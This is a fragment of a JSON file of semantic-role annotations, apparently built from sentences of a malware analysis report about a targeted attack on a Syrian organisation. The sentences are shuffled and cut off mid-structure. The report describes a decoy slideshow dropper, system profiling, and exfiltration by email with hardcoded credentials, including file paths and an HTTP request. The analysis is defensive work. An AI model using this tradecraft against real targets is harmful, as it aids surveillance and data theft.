program"}, "V": {"text": "performing", "index": 34}, "ARG1": {"text": "a single task and communicating"}, "ARGM-MNR": {"text": "via markers left in the registry"}}, "communicating": {"ARG0": {"text": "each program"}, "V": {"text": "communicating", "index": 39}, "ARGM-MNR": {"text": "via markers left"}, "ARG1": {"text": "in the registry"}}, "left": {"ARG1": {"text": "communicating/ via markers"}, "V": {"text": "left", "index": 42}, "ARGM-LOC": {"text": "in the registry"}}}, "\n\nFurther, because the malware sends data captured by the malware to an e-mail address, it does not require that the\nattackers maintain a command-and-control server online": {"sends": {"ARG0": {"text": "the malware"}, "V": {"text": "sends", "index": 5}, "ARG1": {"text": "data"}, "ARG2": {"text": "captured by the malware to an e - mail address"}}, "captured": {"ARG1": {"text": "data"}, "V": {"text": "captured", "index": 7}, "ARG0": {"text": "by the malware"}, "ARGM-MNR": {"text": "to an e - mail address"}}, "does": {"V": {"text": "does", "index": 19}}, "require": {"ARGM-DIS": {"text": "Further"}, "ARGM-CAU": {"text": "because the malware sends data captured by the malware to an e - mail address"}, "ARG0": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "require", "index": 21}, "ARG1": {"text": "that the attackers maintain a command - and - control server online"}}, "maintain": {"ARG0": {"text": "the attackers"}, "V": {"text": "maintain", "index": 25}, "ARG1": {"text": "a command - and - control server"}, "ARGM-LOC": {"text": "online"}}}, " \u201c0x3110x611\u201d\n</list>\nIt then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader": {"runs": {"ARGM-PRD": {"text": "\u201c 0x3110x611 \u201d"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "runs", "index": 5}, "ARG1": {"text": "GooglUpd , which cleans up the program files if they exist , and runs AdbrRader"}}, "cleans": {"ARG0": {"text": "GooglUpd"}, "R-ARG0": {"text": "which"}, "V": {"text": "cleans", "index": 9}, "ARG1": {"text": "the program files"}, "ARGM-ADV": {"text": "if they exist"}}, "exist": {"ARG1": {"text": "they"}, "V": {"text": "exist", "index": 16}}, "runs_2": {"ARG0": {"text": "GooglUpd"}, "R-ARG0": {"text": "which"}, "V": {"text": "runs", "index": 19}, "ARG1": {"text": "AdbrRader"}}}, "\n\nThis attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate\nreversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document": {"has": {"ARG0": {"text": "This attack"}, "R-ARG0": {"text": "which"}, "V": {"text": "has", "index": 4}, "ARG1": {"text": "little technical sophistication ( i.e."}}, "uses": {"ARG0": {"text": "it"}, "V": {"text": "uses", "index": 12}, "ARG1": {"text": "no exploits , code obfuscation , or techniques"}, "ARG2": {"text": "to frustrate reversing , etc . )"}}, "frustrate": {"V": {"text": "frustrate", "index": 22}, "ARG1": {"text": "reversing"}}, "has_2": {"V": {"text": "has", "index": 30}}, "developed": {"ARG0": {"text": "This attack , which has little technical sophistication ( i.e."}, "ARGM-ADV": {"text": "nevertheless"}, "ARGM-MNR": {"text": "carefully"}, "V": {"text": "developed", "index": 32}, "ARG1": {"text": "social engineering"}, "ARGM-LOC": {"text": "in the seeding materials and bait document"}}, "seeding": {"V": {"text": "seeding", "index": 37}, "ARG0": {"text": "materials"}}, "bait": {"V": {"text": "bait", "index": 40}, "ARG1": {"text": "document"}}}, "\n      Use of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among\n      others)": {"Use": {"V": {"text": "Use", "index": 0}, "ARG1": {"text": "of widely available RATs ( njRAT , Xtreme Rat , ShadowTech Rat , DarkComet RAT , and Blackshades"}}}, " The function of\nthe malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each\nreboot": {"appears": {"V": {"text": "appears", "index": 5}, "ARG1": {"text": "to be :"}, "C-ARG1": {"text": "identify and unmask the IP address of target(s ) , and resend them to the attacker with each reboot"}}, "be": {"ARG1": {"text": "The function of the malware"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "identify and unmask the IP address of target(s ) , and resend them to the attacker with each reboot"}}, "identify": {"V": {"text": "identify", "index": 9}, "ARG1": {"text": "the IP address of target(s )"}}, "unmask": {"V": {"text": "unmask", "index": 11}, "ARG1": {"text": "the IP address of target(s )"}}, "resend": {"V": {"text": "resend", "index": 20}, "ARG1": {"text": "them"}, "ARG2": {"text": "to the attacker"}, "ARGM-MNR": {"text": "with each reboot"}}}, " However, that malware had\nsubstantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also\nincluded a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype": {"had": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "malware"}, "V": {"text": "had", "index": 4}, "ARG1": {"text": "substantially more functionality than this case"}}, "did": {"V": {"text": "did", "index": 14}}, "drop": {"ARG0": {"text": "it"}, "V": {"text": "drop", "index": 16}, "ARG1": {"text": "a second stage"}, "ARG2": {"text": "from a compromised site"}}, "compromised": {"V": {"text": "compromised", "index": 22}, "ARG1": {"text": "site"}}, "was": {"V": {"text": "was", "index": 26}}, "included": {"ARGM-ADV": {"text": "also"}, "V": {"text": "included", "index": 28}, "ARG1": {"text": "a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype"}}, "exfiltrating": {"V": {"text": "exfiltrating", "index": 32}, "ARG1": {"text": "credentials from Facebook"}}}, "\n</section>\n<section>\n<heading>Warning: Social Engineering Thrives in Syrian Context</heading>\n\nThis attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the\ntargeted organization": {"was": {"ARG1": {"text": "This attack"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "exceptionally targeted"}}, "targeted": {"ARG1": {"text": "This attack"}, "ARGM-EXT": {"text": "exceptionally"}, "V": {"text": "targeted", "index": 4}}, "reflected": {"ARG2": {"text": "This attack"}, "ARGM-ADV": {"text": "clearly"}, "V": {"text": "reflected", "index": 8}, "ARG1": {"text": "the work of an actor familiar with the operations of the targeted organization"}}, "targeted_2": {"V": {"text": "targeted", "index": 20}, "ARG1": {"text": "organization"}}}, " The\nmalware then sends an e-mail to the same inbox containing the text \u201cHello\u201d and with mxtd file attached": {"sends": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sends", "index": 3}, "ARG1": {"text": "an e - mail"}, "ARG2": {"text": "to the same inbox"}, "C-ARG1": {"text": "containing the text \u201c Hello \u201d and with mxtd file attached"}}, "containing": {"V": {"text": "containing", "index": 12}, "ARG1": {"text": "the text \u201c Hello \u201d"}}, "attached": {"ARG1": {"text": "mxtd file"}, "V": {"text": "attached", "index": 22}}}, "\n</section>\n<section>\n<heading>The Targeting of RSS</heading>\n\nThe unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address": {"was": {"V": {"text": "was", "index": 4}}, "sent": {"ARG1": {"text": "The unsolicited message below"}, "V": {"text": "sent", "index": 5}, "ARG2": {"text": "to RSS"}, "ARGM-TMP": {"text": "at the end of November 2014 from a Gmail email address"}}}, "\nNevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware\non a network, including transmitting data via encrypted e-mail communications": {"believe": {"ARGM-DIS": {"text": "Nevertheless"}, "ARG0": {"text": "we"}, "V": {"text": "believe", "index": 3}, "ARG1": {"text": "that the author of the program is aware of certain techniques to reduce the visibility of malware on a network , including transmitting data via encrypted e - mail communications"}}, "is": {"ARG1": {"text": "the author of the program"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "aware of certain techniques to reduce the visibility of malware on a network , including transmitting data via encrypted e - mail communications"}}, "reduce": {"V": {"text": "reduce", "index": 16}, "ARG1": {"text": "the visibility of malware on a network"}}, "including": {"V": {"text": "including", "index": 25}, "ARG1": {"text": "transmitting data via encrypted e - mail communications"}}, "transmitting": {"V": {"text": "transmitting", "index": 26}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "via encrypted e - mail communications"}}, "encrypted": {"V": {"text": "encrypted", "index": 29}, "ARG1": {"text": "e - mail communications"}}}, "\n\nProgram \u201cAdobeIns.exe\u201d takes the files written by the other programs and zips them in an encrypted, password-\nprotected file:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\drv.sys\\mxtd\n</list>\n</section>\n<section>\n<heading>Data Transmission</heading>\n\nData is transmitted by e-mail to an account presumably controlled by the attacker": {"takes": {"ARG0": {"text": "Program \u201c AdobeIns.exe \u201d"}, "V": {"text": "takes", "index": 4}, "ARG1": {"text": "the files written by the other programs"}}, "written": {"ARG1": {"text": "the files"}, "V": {"text": "written", "index": 7}, "ARG0": {"text": "by the other programs"}}, "protected": {"ARGM-MNR": {"text": "password-"}, "V": {"text": "protected", "index": 20}, "ARG1": {"text": "file"}}, "is": {"V": {"text": "is", "index": 24}}, "transmitted": {"ARG1": {"text": "Data"}, "V": {"text": "transmitted", "index": 25}, "ARG0": {"text": "by e - mail"}, "ARG2": {"text": "to an account presumably controlled by the attacker"}}, "controlled": {"ARG1": {"text": "an account"}, "ARGM-ADV": {"text": "presumably"}, "V": {"text": "controlled", "index": 34}, "ARG0": {"text": "by the attacker"}}}, "\n\nNext, \u201crundl132.exe\u201d performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\f[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder": {"performs": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "\u201c rundl132.exe \u201d"}, "V": {"text": "performs", "index": 5}, "ARG1": {"text": "an HTTP GET request to myexternalip.com"}}, "GET": {"ARG0": {"text": "an HTTP"}, "V": {"text": "GET", "index": 8}, "ARG1": {"text": "request"}, "ARG2": {"text": "to myexternalip.com"}}, "collects": {"ARG0": {"text": "\u201c rundl132.exe"}, "V": {"text": "collects", "index": 13}, "ARG1": {"text": "the external IP of the infected machine"}}, "runs": {"V": {"text": "runs", "index": 25}, "ARG1": {"text": "AdobeIns"}}, "zips": {"R-ARG0": {"text": "which"}, "V": {"text": "zips", "index": 29}, "ARG1": {"text": "the contents of the win32.tmp folder"}}}, " The malware resends the information each time\nthe computer is restarted, but it does not refresh the sent information on restart (which may be a bug)": {"resends": {"ARG0": {"text": "The malware"}, "V": {"text": "resends", "index": 2}, "ARG1": {"text": "the information"}, "ARGM-TMP": {"text": "each time the computer is restarted"}}, "is": {"V": {"text": "is", "index": 9}}, "restarted": {"ARGM-TMP": {"text": "each time"}, "ARG1": {"text": "the computer"}, "V": {"text": "restarted", "index": 10}}, "does": {"V": {"text": "does", "index": 14}}, "refresh": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "refresh", "index": 16}, "ARG1": {"text": "the sent information on restart ( which may be a bug )"}}, "sent": {"V": {"text": "sent", "index": 18}, "ARG1": {"text": "information"}}, "may": {"V": {"text": "may", "index": 24}}, "be": {"ARG1": {"text": "information on restart ("}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "be", "index": 25}, "ARG2": {"text": "a bug )"}}}, "\n</section>\n<section>\n<heading>Analyzing the Attack</heading>\n\nThis section describes a highly targeted attack sent to an e-mail address belonging to RSS": {"describes": {"ARG0": {"text": "This section"}, "V": {"text": "describes", "index": 2}, "ARG1": {"text": "a highly targeted attack sent to an e - mail address belonging to RSS"}}, "targeted": {"ARGM-EXT": {"text": "highly"}, "V": {"text": "targeted", "index": 5}, "ARG1": {"text": "attack"}}, "sent": {"ARG1": {"text": "highly targeted attack"}, "V": {"text": "sent", "index": 7}, "ARG2": {"text": "to an e - mail address belonging to RSS"}}, "belonging": {"ARG0": {"text": "an e - mail address"}, "V": {"text": "belonging", "index": 14}, "ARG1": {"text": "to RSS"}}}, "\n\nAdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials": {"using": {"ARG0": {"text": "AdobeIns"}, "V": {"text": "using", "index": 15}, "ARG1": {"text": "hardcoded credentials"}}, "hardcoded": {"V": {"text": "hardcoded", "index": 16}, "ARG1": {"text": "credentials"}}}, " It registered only 6/55 detections by anti virus scanners, or a 10% detection rate": {"registered": {"ARG0": {"text": "It"}, "V": {"text": "registered", "index": 1}, "ARG1": {"text": "only 6/55 detections/ a 10 % detection rate"}, "ARG2": {"text": "by anti virus scanners"}}}, " In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary": {"is": {"V": {"text": "is", "index": 4}}, "sent": {"ARGM-DIS": {"text": "In addition"}, "ARG1": {"text": "data"}, "V": {"text": "sent", "index": 5}, "ARG2": {"text": "to an Internet e - mail address"}}, "is_2": {"V": {"text": "is", "index": 17}}, "used": {"ARG1": {"text": "no crypter"}, "V": {"text": "used", "index": 18}, "ARG2": {"text": "to obscure the binary"}}, "obscure": {"ARG0": {"text": "no crypter"}, "V": {"text": "obscure", "index": 20}, "ARG1": {"text": "the binary"}}}, "\nIt then runs rundl132 if it has not before, by checking whether registry key name \u201c6\u201d is present": {"runs": {"ARG1": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "runs", "index": 2}, "ARGM-ADV": {"text": "if it has not before"}}, "has": {"V": {"text": "has", "index": 6}}, "checking": {"V": {"text": "checking", "index": 11}, "ARG1": {"text": "whether registry key name \u201c 6 \u201d is present"}}, "is": {"ARG1": {"text": "registry key name \u201c 6 \u201d"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "present"}}}, "\n\nExamples of images in the slideshow as follows:\n<figure></figure>\n<figure></figure>\n<figure></figure>\n</section>\n<section>\n\f\f<heading>Infection and Data Collection</heading>\n\nWhen opened, the \u201cslideshow.zip\u201d file writes and executes several files:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\AdobeR1.exe C:\\Users\\\n[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\pictures.exe\n</list>\n\u201cAdobeR1.exe\u201d is malicious, while \u201cpictures.exe\u201d is the genuine slideshow displayed to the victim": {"follows": {"V": {"text": "follows", "index": 7}}, "is": {"ARG1": {"text": "\u201c AdobeR1.exe \u201d"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "malicious"}, "ARGM-ADV": {"text": "while \u201c pictures.exe \u201d is the genuine slideshow displayed to the victim"}}, "is_2": {"ARG1": {"text": "\u201c pictures.exe \u201d"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "the genuine slideshow displayed to the victim"}}, "displayed": {"ARG1": {"text": "the genuine slideshow"}, "V": {"text": "displayed", "index": 23}, "ARG2": {"text": "to the victim"}}}, "\n\nThe malware is also interesting because it does not provide remote access, but only sends an e-mail containing\nthe victim\u2019s IP address and miscellaneous system information": {"is": {"ARG1": {"text": "The malware"}, "V": {"text": "is", "index": 2}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "interesting"}, "ARGM-CAU": {"text": "because it does not provide remote access"}}, "does": {"V": {"text": "does", "index": 7}}, "provide": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "provide", "index": 9}, "ARG1": {"text": "remote access"}}, "sends": {"ARG0": {"text": "The malware"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "sends", "index": 15}, "ARG1": {"text": "an e - mail containing the victim \u2019s IP address and miscellaneous system information"}}, "containing": {"ARG0": {"text": "an e - mail"}, "V": {"text": "containing", "index": 20}, "ARG1": {"text": "the victim \u2019s IP address and miscellaneous system information"}}}, "\nThe malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time": {"transmits": {"ARG0": {"text": "The malware"}, "V": {"text": "transmits", "index": 2}, "ARGM-MNR": {"text": "autonomously"}, "ARGM-ADV": {"text": "leaving the material in an inbox for the attacker to collect at a later time"}}, "leaving": {"ARG0": {"text": "The malware"}, "V": {"text": "leaving", "index": 5}, "ARG1": {"text": "the material"}, "ARG2": {"text": "in an inbox for the attacker"}, "ARGM-PRP": {"text": "to collect at a later time"}}, "collect": {"V": {"text": "collect", "index": 15}, "ARGM-TMP": {"text": "at a later time"}}}, " The system information could be used to\nidentify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the\nvictim\u2019s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used": {"could": {"V": {"text": "could", "index": 3}}, "be": {"V": {"text": "be", "index": 4}}, "used": {"ARG1": {"text": "The system information"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "used", "index": 5}, "ARG2": {"text": "to identify processes to exploit in the future"}, "ARGM-CAU": {"text": "however since the attacker has already triggered the execution of a file on the victim \u2019s system"}}, "identify": {"V": {"text": "identify", "index": 7}, "ARG1": {"text": "processes to exploit"}, "ARGM-TMP": {"text": "in the future"}}, "exploit": {"V": {"text": "exploit", "index": 10}, "ARGM-TMP": {"text": "in the future"}}, "has": {"V": {"text": "has", "index": 19}}, "triggered": {"ARG0": {"text": "the attacker"}, "ARGM-TMP": {"text": "already"}, "V": {"text": "triggered", "index": 21}, "ARG1": {"text": "the execution of a file on the victim \u2019s system"}}, "is": {"ARGM-CAU": {"text": "since the attacker has already triggered the execution of a file on the victim \u2019s system"}, "V": {"text": "is", "index": 34}, "ARG2": {"text": "surprising"}, "ARG1": {"text": "that more was not taken , or that a RAT ( custom or widely available ) was not used"}}, "was": {"V": {"text": "was", "index": 38}}, "taken": {"ARG1": {"text": "more"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "taken", "index": 40}}, "was_2": {"ARG1": {"text": "a RAT ( custom or widely available )"}, "V": {"text": "was", "index": 52}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "used"}}, "used_2": {"ARG1": {"text": "a RAT ( custom or widely available )"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "used", "index": 54}}}, " A RAT\nwould have provided much greater access alongside IP information\n\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less\nattention from endpoint protection tools and scanners": {"would": {"V": {"text": "would", "index": 2}}, "have": {"V": {"text": "have", "index": 3}}, "provided": {"ARG0": {"text": "A RAT"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "provided", "index": 4}, "ARG1": {"text": "much greater access alongside IP information"}, "ARGM-MNR": {"text": "By not providing remote access and other RAT functionality"}}, "providing": {"ARG0": {"text": "A RAT/ the program"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "providing", "index": 13}, "ARG1": {"text": "remote access and other RAT functionality"}}, "looks": {"ARG0": {"text": "the program"}, "V": {"text": "looks", "index": 23}, "ARG1": {"text": "less like malware"}}, "may": {"ARG0": {"text": "the program"}, "V": {"text": "may", "index": 29}, "ARG1": {"text": "less attention from endpoint protection tools and scanners"}}, "attract": {"ARG0": {"text": "the program"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "attract", "index": 30}, "ARG1": {"text": "less attention"}, "ARGM-DIR": {"text": "from endpoint protection tools and scanners"}}}, " The file\ncontained custom malware that profiled the victim\u2019s computer and beaconed its IP address to an e-mail\naccount under the attacker\u2019s control": {"contained": {"ARG0": {"text": "The file"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "custom malware that profiled the victim \u2019s computer and beaconed its IP address to an e - mail account under the attacker \u2019s control"}}, "profiled": {"ARG0": {"text": "custom malware"}, "R-ARG0": {"text": "that"}, "V": {"text": "profiled", "index": 6}, "ARG1": {"text": "the victim \u2019s computer"}}, "beaconed": {"V": {"text": "beaconed", "index": 12}, "ARG1": {"text": "its IP address"}, "ARG2": {"text": "to an e - mail account"}, "ARGM-LOC": {"text": "under the attacker \u2019s control"}}}, " That incident, observed in 2012, also used hardcoded e-mail to exfiltrate": {"observed": {"ARG1": {"text": "That incident"}, "V": {"text": "observed", "index": 3}, "ARGM-TMP": {"text": "in 2012"}}, "used": {"ARG0": {"text": "That incident , observed in 2012 ,"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "hardcoded e - mail"}, "ARG2": {"text": "to exfiltrate"}}, "hardcoded": {"ARG0": {"text": "That incident"}, "V": {"text": "hardcoded", "index": 9}, "ARG1": {"text": "e - mail to exfiltrate"}}, "exfiltrate": {"ARG0": {"text": "That incident"}, "V": {"text": "exfiltrate", "index": 14}}}, "\n</section>\n<section>\n<heading>Analyzing the Malware</heading>\n\nThe custom malware used in this attack infects a user who views the decoy \u201cslideshow,\u201d and beacons home with the IP\naddress of the victim\u2019s computer and details about his or her system each time the computer restarts": {"used": {"ARG0": {"text": "The custom malware"}, "V": {"text": "used", "index": 3}, "ARGM-LOC": {"text": "in this attack/ infects"}}, "infects": {"ARG0": {"text": "The custom malware"}, "V": {"text": "infects", "index": 7}, "ARG1": {"text": "a user who views the decoy \u201c slideshow , \u201d and beacons home with the IP address of the victim \u2019s computer and details about his or her system each time the computer restarts"}}, "views": {"ARG0": {"text": "a user"}, "R-ARG0": {"text": "who"}, "V": {"text": "views", "index": 11}, "ARG1": {"text": "the decoy \u201c slideshow , \u201d"}}}, " Although targeted, the malware seeding\n      often aims at classes of people (e.g., people interested in \u2018shocking\u2019 news about a fighter, or \u2018leaked\u2019 information\n      about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group": {"targeted": {"V": {"text": "targeted", "index": 1}}, "aims": {"ARGM-ADV": {"text": "Although targeted"}, "ARG0": {"text": "the malware seeding"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "aims", "index": 7}, "ARG2": {"text": "at classes of people"}, "ARG1": {"text": "( e.g. , people interested in \u2018 shocking \u2019 news about a fighter , or \u2018 leaked \u2019 information about the Assad regime ) rather than carefully written spear phishing targeting a single individual or small group"}}, "written": {"ARGM-MNR": {"text": "carefully"}, "V": {"text": "written", "index": 39}, "ARG1": {"text": "spear phishing"}}, "phishing": {"V": {"text": "phishing", "index": 41}}, "targeting": {"ARG0": {"text": "carefully written spear phishing"}, "V": {"text": "targeting", "index": 42}, "ARG1": {"text": "a single individual or small group"}}}, " It sets the key to \u201c0\u201d and\nruns it": {"sets": {"ARG0": {"text": "It"}, "V": {"text": "sets", "index": 1}, "ARG1": {"text": "the key to \u201c 0 \u201d and runs it"}}, "runs": {"ARG0": {"text": "It"}, "V": {"text": "runs", "index": 9}, "ARG1": {"text": "it"}}}, " For example:\n\n      The malware beacons location but does not provide RAT functionality": {"does": {"V": {"text": "does", "index": 8}}, "provide": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "The malware"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "provide", "index": 10}, "ARG1": {"text": "RAT functionality"}}}, "\n      The malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-\n      control server online": {"exfiltrates": {"ARG0": {"text": "The malware"}, "V": {"text": "exfiltrates", "index": 2}, "ARG1": {"text": "to an online e - mail account"}, "ARGM-ADV": {"text": "thus not requiring the attacker to maintain a command - and- control server online"}}, "requiring": {"ARG0": {"text": "The malware"}, "ARGM-ADV": {"text": "thus"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "requiring", "index": 13}, "ARG2": {"text": "the attacker"}, "ARG1": {"text": "to maintain a command - and- control server"}}, "maintain": {"ARG0": {"text": "the attacker"}, "V": {"text": "maintain", "index": 17}, "ARG1": {"text": "a command"}}}, "\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\n</list>\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n</list>\nThen nvidrv runs nvisdvr (registry key \u201c4\u201d) that collects a list of running processes, which are written to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n</list>\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com": {"tests": {"ARG0": {"text": "svhosts"}, "R-ARG0": {"text": "which"}, "V": {"text": "tests", "index": 7}, "ARG1": {"text": "Internet connectivity"}, "ARGM-MNR": {"text": "by doing a DNS query for windowsupdate.microsoft.com"}}, "doing": {"ARG0": {"text": "which"}, "V": {"text": "doing", "index": 11}, "ARG1": {"text": "a DNS query"}, "ARG2": {"text": "for windowsupdate.microsoft.com"}}}, "\n      At least one command-and-control server located within Syrian IP space (often from a limited range of addresses)": {"located": {"ARG1": {"text": "At least one command - and - control server"}, "V": {"text": "located", "index": 9}, "ARGM-LOC": {"text": "within Syrian IP space ("}}}, "\n250 2.0.0 Ok: queued as [REDACTED]\nQUIT\n221 2.0.0 Bye\n</list>\n</section>\n<section>\n<heading>Evaluation of the Malware\u2019s Functionality</heading>\n\nThe malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a\nsingle task, and each communicating via markers dropped in the Registry": {"queued": {"V": {"text": "queued", "index": 4}, "ARGM-ADV": {"text": "as [ REDACTED ]"}}, "seen": {"ARG1": {"text": "The malware"}, "V": {"text": "seen", "index": 15}, "ARGM-LOC": {"text": "in this case study"}}, "is": {"ARG1": {"text": "queued as [ REDACTED ] QUIT 221 2.0.0 Bye The malware seen in this case study"}, "V": {"text": "is", "index": 20}, "ARG2": {"text": "unusual"}, "ARGM-CAU": {"text": "as it relies on a half - dozen separate executable files , each with a single task , and each communicating via markers dropped in the Registry"}}, "relies": {"ARG0": {"text": "it"}, "V": {"text": "relies", "index": 24}, "ARG1": {"text": "on a half - dozen separate executable files/ each with a single task"}}, "communicating": {"V": {"text": "communicating", "index": 42}}, "dropped": {"ARG1": {"text": "each communicating"}, "ARGM-MNR": {"text": "via markers"}, "V": {"text": "dropped", "index": 45}, "ARG2": {"text": "in the Registry"}}}, "\n\nIn addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure": {"uses": {"ARGM-DIS": {"text": "In addition"}, "ARG0": {"text": "the malware"}, "V": {"text": "uses", "index": 5}, "ARG1": {"text": "the old PKWARE implementation of zip encryption , which is not particularly secure"}}, "is": {"ARG1": {"text": "zip encryption"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 15}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "particularly secure"}}}, " When the slideshow is\nclosed both AdobeR1.exe and pictures.exe are deleted": {"is": {"V": {"text": "is", "index": 3}}, "closed": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the slideshow"}, "V": {"text": "closed", "index": 4}}, "are": {"ARGM-TMP": {"text": "When the slideshow is closed"}, "ARG1": {"text": "both AdobeR1.exe and pictures.exe"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "deleted"}}, "deleted": {"ARGM-TMP": {"text": "When the slideshow is closed"}, "ARG1": {"text": "AdobeR1.exe and pictures.exe"}, "V": {"text": "deleted", "index": 10}}}, "\n\nUnlike Syrian regime-linked malware, it contains no Remote Access Trojan (RAT) functionality,\nsuggesting it is intended for identifying and locating a target": {"linked": {"ARG0": {"text": "Syrian regime"}, "V": {"text": "linked", "index": 4}, "ARG1": {"text": "malware"}}, "contains": {"ARGM-ADV": {"text": "Unlike Syrian regime - linked malware"}, "ARG0": {"text": "it"}, "V": {"text": "contains", "index": 8}, "ARG1": {"text": "no Remote Access Trojan ( RAT ) functionality"}, "ARGM-PRD": {"text": "suggesting it is intended for identifying and locating a target"}}, "suggesting": {"ARG0": {"text": "it"}, "V": {"text": "suggesting", "index": 18}, "ARG1": {"text": "it is intended for identifying and locating a target"}}, "is": {"V": {"text": "is", "index": 20}}, "intended": {"ARG2": {"text": "it"}, "V": {"text": "intended", "index": 21}, "ARG1": {"text": "for identifying and locating a target"}}, "identifying": {"V": {"text": "identifying", "index": 23}, "ARG1": {"text": "a target"}}, "locating": {"V": {"text": "locating", "index": 25}, "ARG1": {"text": "a target"}}}, " AdbrRader\n(communicating through registry key \u201c2\u201d) writes the file vgadmysadm.tmp with the name of another registry key \u201c2\u201d with\nstartup info": {"communicating": {"ARG0": {"text": "AdbrRader ("}, "V": {"text": "communicating", "index": 2}, "ARGM-MNR": {"text": "through registry key \u201c 2 \u201d"}, "ARG1": {"text": "the name of another registry key \u201c 2 \u201d with startup info"}}, "writes": {"ARG0": {"text": "AdbrRader ( communicating"}, "ARGM-MNR": {"text": "through registry key \u201c 2 \u201d )/ with the name of another registry key \u201c 2 \u201d with startup info"}, "V": {"text": "writes", "index": 10}, "ARG1": {"text": "the file vgadmysadm.tmp"}}}, "\n\nTransmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a\nlayer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server": {"Transmitting": {"V": {"text": "Transmitting", "index": 0}, "ARG1": {"text": "the malware"}, "ARGM-MNR": {"text": "via e - mail"}}, "provides": {"ARG0": {"text": "Transmitting the malware via e - mail"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "provides", "index": 8}, "ARG1": {"text": "a degree of obscurity"}}, "has": {"ARG0": {"text": "Transmitting the malware via e - mail"}, "V": {"text": "has", "index": 15}, "ARG1": {"text": "the additional advantage of providing a layer of abstraction between the attacker and the target"}}, "providing": {"V": {"text": "providing", "index": 20}, "ARG1": {"text": "a layer of abstraction between the attacker and the target"}}, "is": {"V": {"text": "is", "index": 33}, "ARG1": {"text": "no need to maintain a RAT command - and - control server"}}, "maintain": {"V": {"text": "maintain", "index": 37}, 